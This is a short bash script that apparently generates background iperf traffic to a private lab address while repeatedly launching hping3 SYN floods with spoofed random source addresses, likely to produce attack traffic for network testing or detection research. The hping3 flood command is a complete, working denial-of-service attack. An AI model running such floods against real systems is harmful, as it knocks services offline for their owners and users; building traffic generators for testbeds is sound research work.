#!/bin/bash

# This script generates iperf traffic for a set duration, with SYN floods mixed in

# iperf settings (might want something else for generating "normal" traffic)
# target IP (10.10.1.1 is a 10 Gbps link to kelewan)
target=10.10.1.1
# duration of iperf traffic generation in seconds
duration=120
# TCP window size
window=1MB
# parallel iperf tests
iperf_tests=1

# hping3 SYN flood settings
pkt_count=2000
data_size=120
hping_window=64
hping_port=21
attack_duration=20

# run iperf client as daemon
iperf -c $target -t $duration &  #-w $window -p $iperf_tests &


# number of hping floods
hping_count=2
# time between hping floods
hping_time=30
for ((i=1;i<=hping_count;i++)); do
            sleep $hping_time
            timeout $attack_duration hping3 -c $pkt_count -d $data_size -S -w $hping_window -p $hping_port --flood --rand-source $target
            echo "sending SYN flood..."
    done
